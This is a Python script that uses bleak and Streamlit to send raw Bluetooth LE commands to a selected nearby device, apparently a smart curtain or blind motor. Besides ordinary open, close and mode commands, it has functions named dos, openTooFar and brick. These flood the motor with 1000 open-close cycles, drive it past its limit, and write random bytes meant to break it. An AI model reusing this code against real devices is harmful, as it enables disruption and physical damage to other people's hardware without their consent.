import asyncio
from bleak import BleakClient
from pandas.core.ops import logical_op
import streamlit as st
import random

global model
model = "cba20002-224d-11e6-9fb8-0002a5d5c51b"


def dos():
    loop = asyncio.get_event_loop()
    close = bytes.fromhex("570f450101010000")
    open = bytes.fromhex("570f45010101ff00")

    loop.run_until_complete(executeLooped(model, [open, close]))


def infinite():
    loop = asyncio.get_event_loop()
    start = bytes.fromhex("570f450406010101")
    iets = bytes.fromhex("570f4504020100")
    anders = bytes.fromhex("570f450501")
    ltr = bytes.fromhex("570f450508010101")
    gaan = bytes.fromhex("570f4505040001")

    loop.run_until_complete(execute(model, [start, iets, anders, ltr, gaan]))


def stopInfinite():
    loop = asyncio.get_event_loop()

    stop = bytes.fromhex("570f45050500")

    loop.run_until_complete(execute(model, [stop]))


def clear():
    loop = asyncio.get_event_loop()
    clear = bytes.fromhex("570f450303")

    loop.run_until_complete(execute(model, [clear]))


def open():
    loop = asyncio.get_event_loop()
    open = bytes.fromhex("570f450101016400")

    loop.run_until_complete(execute(model, [open]))


def openTooFar():
    loop = asyncio.get_event_loop()

    open = bytes.fromhex("570f45010101ff00")

    loop.run_until_complete(execute(model, [open]))


def close():
    loop = asyncio.get_event_loop()

    close = bytes.fromhex("570f450101010000")

    loop.run_until_complete(execute(model, [close]))


def silent():
    loop = asyncio.get_event_loop()
    silent = bytes.fromhex("570f450401010101")

    loop.run_until_complete(execute(model, [silent]))


def normal():
    loop = asyncio.get_event_loop()
    silent = bytes.fromhex("570f450401010000")

    loop.run_until_complete(execute(model, [silent]))


def brick():
    loop = asyncio.get_event_loop()
    brick = bytes([random.randint(0, 255) for _ in range(50)])

    loop.run_until_complete(execute(model, [brick]))


async def execute(model, toExecute):
    if ("address" not in st.session_state) or (
        len(st.session_state.address.selection.rows)
    ) == 0:
        st.error("No object selected!")
        return
    address = st.session_state.df.loc[
        st.session_state.address.selection.rows[0], "address"
    ]
    async with BleakClient(address) as client:
        for command in toExecute:
            await client.write_gatt_char(model, command)


async def executeLooped(model, toExecute):
    with st.spinner("Wait for it...", show_time=True):
        if ("address" not in st.session_state) or (
            len(st.session_state.address.selection.rows)
        ) == 0:
            st.error("No object selected!")
            return
        address = st.session_state.df.loc[
            st.session_state.address.selection.rows[0], "address"
        ]
        async with BleakClient(address) as client:
            for i in range(1000):
                for command in toExecute:
                    await client.write_gatt_char(model, command)


def hack():
    print("hi")

